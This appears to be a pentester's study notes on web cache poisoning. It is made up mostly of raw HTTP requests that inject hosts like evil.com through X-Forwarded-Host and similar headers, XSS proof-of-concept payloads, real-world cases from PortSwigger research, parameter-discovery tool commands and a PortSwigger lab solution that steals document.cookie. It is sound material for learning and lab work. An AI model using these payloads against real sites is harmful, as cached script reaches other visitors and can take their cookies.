# Web Cache Poisoning
## **Introduction**
The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.

https://book.hacktricks.xyz/pentesting-web/cache-deception

https://infosecwriteups.com/cache-poisoning-with-xss-a-peculiar-case-eb5973850814

https://owasp.org/www-community/attacks/Cache_Poisoning



## **How to Find**
1. Basic poisoning
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: evil.com
```
The response is
```
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<img href="https://evil.com/a.png" />
```
> Or you can input XSS payloads
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: a.\"><script>alert(1)</script>
```
The response is
```
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<img href="https://a.\"><script>alert(1)</script>a.png" />
```
2. Seizing the Cache
```
GET / HTTP/1.1
Host: unity3d.com
X-Host: evil.com
```
The response is
```
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://evil.com/x.js">
</script>
```
3. Selective poisoning
```
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
X-Forwarded-Host: a"><iframe onload=alert(1)>
```
The response is
```
HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
```
4. Chaining Unkeyed Inputs 
- First step
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
```
The response is
```
HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=xyz
```
- Second step
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
```
The response is
```
HTTP/1.1 301 Moved Permanently
Location: https://redacted.net
```
- Third step
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```
The response is
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

5. Route Poisoning
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: evil
```
The response is
```
HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
...
<title>HubSpot - Page not found</title>
<p>The domain canary does not exist in our system.</p>
```
To exploit this, we
need to go to hubspot.com, register ourselves as a HubSpot client, place a payload on our HubSpot page, and
then finally trick HubSpot into serving this response on goodhire.com
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
```
The response is
```
HTTP/1.1 200 OK
…
<script>alert(document.domain)</script>
```

6. Hidden Route Poisoning
```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: evil
```
The response is
```
HTTP/1.1 302 Found
Location: https://ghost.org/fail/
```
When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a
blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has
defined a custom domain, their ghost.io subdomain will simply redirect to it:
```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io
```
The response is
```
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

Reference:
- [Portswigger](https://portswigger.net/research/practical-web-cache-poisoning)




# Web Cache Poisoning

## General

{% hint style="info" %}
Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.
{% endhint %}

## Tools

```bash
# https://github.com/s0md3v/Arjun
python3 arjun.py -u https://url.com --get 
python3 arjun.py -u https://url.com --post
# https://github.com/maK-/parameth
python parameth.py -u https://example.com/test.php
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py --domain example.com
# https://github.com/s0md3v/Parth
python3 parth.py -t example.com
```

```markup
# XSS for users accessing /en?region=uk:
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

####

# https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

####



```
Lab: Web cache poisoning with an unkeyed header
PRACTITIONER
This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

Hint

Solution
With Burp running, load the website's home page
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
Add a cache-buster query parameter, such as ?cb=1234.
Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request.
Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.
Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Open the GET request for the home page in Burp Repeater and remove the cache buster.
Add the following header, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
To simulate the victim, load the poisoned URL in the browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.
